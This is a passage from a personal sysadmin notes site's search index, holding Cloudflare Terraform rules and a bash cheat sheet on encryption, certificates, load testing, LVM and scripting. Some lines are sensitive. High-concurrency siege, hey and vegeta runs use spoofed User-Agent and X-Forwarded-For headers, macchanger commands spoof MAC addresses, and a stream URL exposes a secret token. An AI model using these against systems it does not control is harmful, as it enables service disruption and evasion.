style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       cache_ttl_by_status {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           codes = \u0026#34;405-499\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           ttl = -1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       cache_ttl_by_status {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           codes = \u0026#34;500-599\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           ttl = 0\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  # }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e}\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# resource \u0026#34;cloudflare_page_rule\u0026#34; \u0026#34;rules\u0026#34; {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#   count = \u0026#34;${length(keys(\u0026#34;${var.targets}\u0026#34;))}\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#   lifecycle {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#     create_before_destroy = true\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#   }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#   zone_id = \u0026#34;92c6d5010fbacab27d464f4d79c11fce\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#   target = \u0026#34;${var.targets[element(keys(var.targets),count.index)]}\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#   actions {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#     always_use_https = \u0026#34;true\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#     cache_level = \u0026#34;cache_everything\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#   }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#   priority = \u0026#34;${count.index + 1}\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eTerraform_create_rate_limit_rule\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-hcl\" data-lang=\"hcl\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Create rate limit rule\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eresource\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cloudflare_rate_limit\u0026#34; \u0026#34;wss_rate_limit\u0026#34;\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  zone_id \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;92c6d5010fbacab27d464f4d79c11fce\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  threshold \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e50\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  period \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e60\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ematch\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003erequest\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      url_pattern \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;*wss*/*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eaction\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    mode \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ban\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    timeout \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e3600\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ecorrelate\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    by \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;nat\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eresource\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cloudflare_rate_limit\u0026#34; \u0026#34;frontend_rate_limit\u0026#34;\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  zone_id \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;92c6d5010fbacab27d464f4d79c11fce\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  threshold \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e50\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  period \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ematch\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003erequest\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      url_pattern \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;*h5*/*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eaction\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    mode \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ban\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    timeout \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e3600\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ecorrelate\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    by \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;nat\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eAPI Document\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://developers.cloudflare.com/api/operations/custom-hostname-for-a-zone-create-custom-hostname\" target=\"_blank\" rel=\"noopener\"\u003eCloudflare for SaaS\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://developers.cloudflare.com/api/operations/dns-records-for-a-zone-create-dns-record\" target=\"_blank\" rel=\"noopener\"\u003epartial (CNAME) zone\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Cloudflare docs"},{"categories":null,"contents":" ab ab -n 20 -c 20 -k https://default.hddv1.com/error age # generate public and private keys age-keygen -o key.txt # encrypt file with public key age -r public_key -o file.txt.enc file.txt # encrypt file with ssh key age -R ~/.ssh/id_ed25519.pub file.txt \u0026gt; file.txt.enc # decrypt file age --decrypt -i key.txt file.txt.enc \u0026gt; file.txt awk # To lowercase uuidgen|awk \u0026#39;{print tolower($0)}\u0026#39; # output: 649612b0-0fa4-4b50-9b13-17279f602a43 # To uppercase echo \u0026#39;hello world\u0026#39;|awk \u0026#39;{print toupper($0)}\u0026#39; # output: HELLO WORLD # 提取子字符串: `substr(string, start, length)` echo \u0026#34;hello world\u0026#34; | awk \u0026#39;{print substr($0, 1, 5)}\u0026#39; # output: hello # 全局替換字符串中的正則表達式匹配項: `gsub(regex, replacement, string)` # 替換字符串中首次匹配的正則表達式: `sub(regex, replacement, string)` echo \u0026#34;hello world\u0026#34; | awk \u0026#39;{gsub(/world/, \u0026#34;everyone\u0026#34;); print $0}\u0026#39; # output: hello everyone # 將數字轉換為整數 echo \u0026#34;3.14\u0026#34; | awk \u0026#39;{print int($0)}\u0026#39; # output: 3 # 返回平方根 echo \u0026#34;99\u0026#34; | awk \u0026#39;{print sqrt($0)}\u0026#39; # output: 9.94987 # 指數和對數 echo \u0026#34;2\u0026#34; | awk \u0026#39;{print exp($0), log($0)}\u0026#39; # output: 7.38906 0.693147 caffeinate # 防止显示器关闭 caffeinate -d # 保持系统不休眠 caffeinate -i # 保持 30 分钟 caffeinate -t 1800 certbot # Install sudo apt install certbot python3-certbot-nginx python3-certbot-dns-route53 # 1. Generating Wildcard Certificates sudo certbot certonly --manual --preferred-challenges=dns --server https://acme-v02.api.letsencrypt.org/directory --agree-tos -d *.example.com ### add txt record then press enter to continue # 2. Generating Wildcard Certificates sudo certbot certonly -d example.com -d *.example.com --dns-route53 --agree-tos --server https://acme-v02.api.letsencrypt.org/directory # Automating Renewal 0 0 * * 1 /usr/bin/certbot certonly --dns-route53 -d *.example.com --quiet --post-hook \u0026#34;systemctl reload nginx\u0026#34; cutycapt # Capture website page as picture xvfb-run --server-args=\u0026#34;-screen 0, 1024x768x24\u0026#34; cutycapt --url=https://www.google.com --out=\u0026#34;/tmp/google.png\u0026#34; dmesg sudo dmesg -T | grep -i \u0026#39;killed process\u0026#39; # total-vm: 該程序分配的虛擬記憶體總量（含未實際使用） # anon-rss: 匿名頁面 resident memory（實際佔用記憶體）→ 重點 # file-rss: 映射檔案的 resident memory（如 shared libraries） # shmem-rss: 共用記憶體的 resident memory dnscontrol creds.json command dnscontrol get-zones --format=js --out=example.com.js r53 ROUTE53 example.com dnscontrol get-zones --format=js --out=example.com.js cloudflare CLOUDFLAREAPI example.com ffmpeg # Download sample video wget https://www.sample-videos.com/video321/mp4/720/big_buck_bunny_720p_1mb.mp4 -O test.mp4 # Push stream ffmpeg -re -i test.mp4 -c copy -f flv \u0026#34;rtmp://209357.push.tlivecloud.com/live/big_buck_bunny_720p_1mb?txSecret=a543b79d9a8c38ace5ce18eea2bd7721\u0026amp;txTime=687E4609\u0026#34; go go tool pprof -http=:8081 20250814_024534.heap k6 k6.js command k6 run k6.js kafka # list topics kafka-topics.sh --bootstrap-server 127.0.0.1:9094 --list # all topics count kafka-topics.sh --bootstrap-server 127.0.0.1:9094 --list |wc -l hey hey -n 200000 -c 500 -h2 -z 30s https://a8-wss.hddv1.com/test openfortivpn # https://github.com/adrienverge/openfortivpn sudo openfortivpn ip:port --username=ricky --pppd-use-peerdns=1 openssl # 自簽名證書，要把 ca.p7b 匯入 certmgr.msc 的受信任的根憑證授權單位，Chrome 才吃的到。 openssl crl2pkcs7 -nocrl -certfile ca.crt -out ca.p7b prlimit # 更改 Max_open_files 遇到參數錯誤，原因為 CentOS6 與 CentOS7 指令不同 # CentOS6 for i in $(ps -ef | grep \u0026#39;publish/server/game_server\u0026#39; | egrep -v \u0026#39;grep|startall\u0026#39; | awk \u0026#39;{print $2}\u0026#39;); do echo -n \u0026#34;Max open files=1024000:1024000\u0026#34; \u0026gt; /proc/$i/limits; done # CentOS7 for i in $(ps -ef | grep gateway | grep -v grep | awk \u0026#39;{print $2}\u0026#39;); do prlimit --pid $i --nofile=1024000:1024000 ; done siege siege --time=3s --concurrent=30000 https://a8-h5.hddv1.com/index.html tr # cat krypton2 YRIRY GJB CNFFJBEQ EBGGRA # cat krypton2 | tr a-zA-Z n-za-mN-ZA-M LEVEL TWO PASSWORD ROTTEN vegeta #!/usr/bin/env bash attack() { echo \u0026#34;GET ${1}\u0026#34; | vegeta attack -duration=100s -header=\u0026#34;User-Agent: baidu\u0026#34; -header=\u0026#34;X-Forwarded-For: 47.0.0.1\u0026#34; -rate=500 -timeout=1s | vegeta encode | jaggr @count=rps \\ hist\\[100,200,300,400,500\\]:code \\ p25,p50,p95:latency \\ sum:bytes_in \\ sum:bytes_out | jplot rps+code.hist.100+code.hist.200+code.hist.300+code.hist.400+code.hist.500 \\ latency.p95+latency.p50+latency.p25 \\ bytes_in.sum+bytes_out.sum } if [[ -n ${1} ]]; then attack ${1} fi ## -header=\u0026#34;Connection: Upgrade\u0026#34; -header=\u0026#34;Upgrade: websocket\u0026#34; wrk wrk -t10 -c1000 -d30s -H \u0026#34;User-Agent: baidu\u0026#34; \u0026#34;https://default.hddv1.com/error\u0026#34; Vagrant with hyper-v provider Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All Common # Find out processes swap usage command for file in /proc/*/status ; do awk \u0026#39;/VmSwap|Name/{printf $2 \u0026#34; \u0026#34; $3}END{ print \u0026#34;\u0026#34;}\u0026#39; $file; done | sort -k 2 -n -r | less Gitbook Hide gitbook sidebar default.\nraw_path=$(pwd) npm install -g gitbook-cli gitbook install cd ~/.gitbook/versions/3.2.3/node_modules/gitbook-plugin-theme-default sed -i \u0026#34;25i\\ \\ \\ \\ gitbook.storage.set(\u0026#39;sidebar\u0026#39;, false);\u0026#34; src/js/theme/sidebar.js npm install -g browserify uglify-js less less-plugin-clean-css npm install src/build.sh Install - autocorrect A linter and formatter for help you improve copywriting, to correct spaces, words, punctuations between CJK (Chinese, Japanese, Korean). Github\nwget https://github.com/huacnlee/autocorrect/releases/download/v1.7.4/autocorrect-darwin-amd64.tar.gz - bpf BCC - Tools for BPF-based Linux IO analysis, networking, monitoring, and more Kernel should higher than 4.1 Install from source is better\n# `/usr/share/bcc/` # https://github.com/iovisor/bcc # https://github.com/iovisor/bcc/blob/master/docs/reference_guide.md#1-kernel-source-directory # https://github.com/iovisor/bpftrace yum install bcc-tools - flamegraph Stack trace visualizer\n# https://github.com/brendangregg/FlameGraph brew install flamegraph - git-split-diffs GitHub style split diffs in your terminal\nnpm install -g git-split-diffs - glci Test your Gitlab CI Pipelines changes locally using Docker. blog\nyarn global add glci - openresty wget https://openresty.org/package/centos/openresty.repo -O /etc/yum.repos.d/openresty.repo yum install -y openresty openresty-resty - perf Performance monitoring for the Linux kernel\n# https://github.com/brendangregg/Misc/blob/master/perf_events/perf.md # http://www.brendangregg.com/perf.html yum install perf - pptx2md A pptx to markdown converter\npip3 install pptx2md - sockperf Network Benchmarking Utility\n# https://github.com/Mellanox/sockperf yum install sockperf - upx UPX - the Ultimate Packer for eXecutables\nbrew install upx - wrk Modern HTTP benchmarking tool\nbrew install wrk LVM # 確認 resize 在哪個 disk lsblk # 確認 `/dev/sde` 是否為該新增 disk 路徑 pvresize /dev/sde # vgdisplay [vg 編號] # 查 free PE / Size 的編號 vgdisplay vg3 # 要升級的 lvm 硬碟路徑 lvdisplay # lvresize -l +[free 的編號] 升級的 lvm 硬碟路徑 lvresize -l +38400 /dev/vg3/disklvm4 # resize xfs_growfs /dev/vg3/disklvm4 # 檢查擴充是否成功 df -h Migration zabbix mysqldump -uroot --opt zabbix \u0026gt; zabbix.sql rsync -az zabbix.sql newserver:/root mysql -uroot zabbix \u0026lt; zabbix.sql Re-create /dev/null rm -f /dev/null mknod /dev/null c 1 3 Script Script Optimization Advanced Shell Scripting Techniques: Automating Complex Tasks with Bash\nUse Built-in Commands: Built-in commands execute faster because they don\u0026rsquo;t require loading an external process. Minimize Subshells: Subshells can be expensive in terms of performance. # Inefficient output=$(cat file.txt) # Efficient output=$(\u0026lt;file.txt) Use Arrays for Bulk Data: When handling a large amount of data, arrays can be more efficient and easier to manage than multiple variables. # Inefficient item1=\u0026#34;apple\u0026#34; item2=\u0026#34;banana\u0026#34; item3=\u0026#34;cherry\u0026#34; # Efficient items=(\u0026#34;apple\u0026#34; \u0026#34;banana\u0026#34; \u0026#34;cherry\u0026#34;) for item in \u0026#34;${items[@]}\u0026#34;; do echo \u0026#34;$item\u0026#34; done Enable Noclobber: To prevent accidental overwriting of files. set -o noclobber Use Functions: Functions allow you to encapsulate and reuse code, making scripts cleaner and reducing redundancy. Efficient File Operations: When performing file operations, use efficient techniques to minimize resource usage. # Inefficient while read -r line; do echo \u0026#34;$line\u0026#34; done \u0026lt; file.txt # Efficient while IFS= read -r line; do echo \u0026#34;$line\u0026#34; done \u0026lt; file.txt Parallel Processing: Tools like xargs and GNU parallel can be incredibly useful. Error Handling: Robust error handling is critical for creating reliable and maintainable scripts. # Exit on Error: Using set -e ensures that your script exits immediately if any command fails, preventing cascading errors. set -e # Custom Error Messages: Implement custom error messages to provide more context when something goes wrong. command1 || { echo \u0026#34;command1 failed\u0026#34;; exit 1; } # Trap Signals: Use the `trap` command to catch and handle signals and errors gracefully. trap \u0026#39;echo \u0026#34;Error occurred\u0026#34;; cleanup; exit 1\u0026#39; ERR function cleanup() { # Cleanup code } # Validate Inputs: Always validate user inputs and script arguments to prevent unexpected behavior. if [[ -z \u0026#34;$1\u0026#34; ]]; then echo \u0026#34;Usage: $0 \u0026lt;argument\u0026gt;\u0026#34; exit 1 fi # Logging: Implement logging to keep track of script execution and diagnose issues. logfile=\u0026#34;script.log\u0026#34; exec \u0026gt; \u0026gt;(tee -i $logfile) exec 2\u0026gt;\u0026amp;1 echo \u0026#34;Script started\u0026#34; Automating Complex System Administration Tasks: Automated Backups System Monitoring User Management Automated Updates Network Configuration macOS install specific version Safari softwareupdate -l sudo softwareupdate -i \u0026#39;Safari18.6VenturaAuto-18.6\u0026#39; macchanger # 將指定的介面卡恢復原樣，所以不用擔心改不回來 macchanger -p eth0 # 列出製造商清單，MAC地址的前六碼就是表示該製造商，以下節錄指令結果片段 macchanger -l Num\tMAC\tVendor 0009\t00:00:09\tXEROX CORPORATION 0010\t00:00:0a\tOMRON TATEISI ELECTRONICS CO. 0011\t00:00:0b\tMATRIX CORPORATION 0012\t00:00:0c\tCISCO SYSTEMS, INC. 0013\t00:00:0d\tFIBRONICS LTD. # 保留當前製造商資訊，產生新的MAC地址 macchanger -e eth0 # 更換當前製造商資訊，產生新的MAC地址，差別是-a是指定同類，例如都是wireless card macchanger -A eth0 or macchanger -a eth0 # 以亂數產生新的MAC地址，所以可能前六碼沒有對應的製造商資訊 macchanger -r eth0 # 直接指定MAC地址 macchanger -m aa:aa:aa:aa:aa:aa eth0 ## 修改後可以透過ifconfig或是macchanger -s eth0來查看當前的MAC地址 ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/bash/common/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eab\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eab -n \u003cspan style=\"color:#ae81ff\"\u003e20\u003c/span\u003e -c \u003cspan style=\"color:#ae81ff\"\u003e20\u003c/span\u003e -k https://default.hddv1.com/error\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eage\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# generate public and private keys\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eage-keygen -o key.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# encrypt file with public key\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eage -r public_key -o file.txt.enc file.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# encrypt file with ssh key\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eage -R ~/.ssh/id_ed25519.pub file.txt \u0026gt; file.txt.enc\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# decrypt file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eage --decrypt -i key.txt file.txt.enc \u0026gt; file.txt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eawk\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# To lowercase\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 